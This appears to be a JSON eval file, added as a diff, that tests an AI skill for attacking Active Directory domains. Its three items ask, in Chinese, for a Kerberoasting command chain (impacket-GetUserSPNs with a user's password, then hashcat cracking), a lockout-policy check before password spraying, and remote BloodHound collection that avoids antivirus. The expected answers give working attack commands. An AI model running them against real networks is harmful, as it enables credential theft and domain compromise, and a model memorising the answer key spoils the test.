@@ -1,0 +1,59 @@
+{
+  "skill_name": "ad-domain-attack",
+  "evals": [
+    {
+      "id": 1,
+      "name": "ad-kerberoasting-specific-commands",
+      "prompt": "你拿到域内普通用户 CORP\\jsmith 的明文密码。请写出 Kerberoasting 攻击的完整命令链（从获取 SPN 到破解），用 impacket 工具集。",
+      "expected_output": "impacket-GetUserSPNs -request -dc-ip 10.0.0.10 CORP/jsmith:Password123 -outputfile spn_hashes.txt，然后 hashcat -m 13100 spn_hashes.txt wordlist.txt",
+      "expectations": [
+        "GetUserSPNs|impacket|SPN枚举",
+        "-request|请求TGS|获取哈希",
+        "hashcat -m 13100|hashcat|13100|离线破解",
+        "-dc-ip|域控IP|LDAP查询",
+        "TGS票据|Kerberos|服务票据"
+      ],
+      "required_terms": [
+        "hashcat -m 13100",
+        "hashcat",
+        "GetUserSPNs"
+      ]
+    },
+    {
+      "id": 2,
+      "name": "ad-password-policy-before-spray",
+      "prompt": "在域环境中准备做密码喷洒之前，为什么必须先查询密码策略？用什么命令查？需要关注哪些字段？",
+      "expected_output": "net accounts /domain 查询密码策略。关注：Lockout threshold（锁定阈值）、Lockout duration（锁定时长）、Lockout observation window（观察窗口）。避免触发账户锁定影响可用性",
+      "expectations": [
+        "net accounts /domain|密码策略|查询策略",
+        "Lockout threshold|锁定阈值|失败次数",
+        "Lockout duration|锁定时长|冷却时间",
+        "账户锁定|避免锁定|影响可用性",
+        "observation window|观察窗口|重置计数"
+      ],
+      "required_terms": [
+        "net accounts /domain",
+        "Lockout duration",
+        "observation window"
+      ]
+    },
+    {
+      "id": 3,
+      "name": "ad-bloodhound-collection",
+      "prompt": "你需要用 BloodHound 分析域攻击路径。但你只有一个域内低权限用户，没法上传 SharpHound.exe（杀软拦截）。有替代方案吗？",
+      "expected_output": "用 Python 版的 bloodhound-python（bloodhound.py）远程收集：bloodhound-python -d corp.local -u jsmith -p 'Password123' -ns 10.0.0.10 -c all。不需要在目标上执行任何程序",
+      "expectations": [
+        "bloodhound-python|bloodhound.py|Python版|远程收集",
+        "-c all|收集所有数据|ACL|Session|Group",
+        "无需上传|不接触目标|远程LDAP",
+        "SharpHound|被拦截|杀软|替代",
+        "-ns|DNS|域控|LDAP查询"
+      ],
+      "required_terms": [
+        "ACL",
+        "SharpHound",
+        "DNS"
+      ]
+    }
+  ]
+}
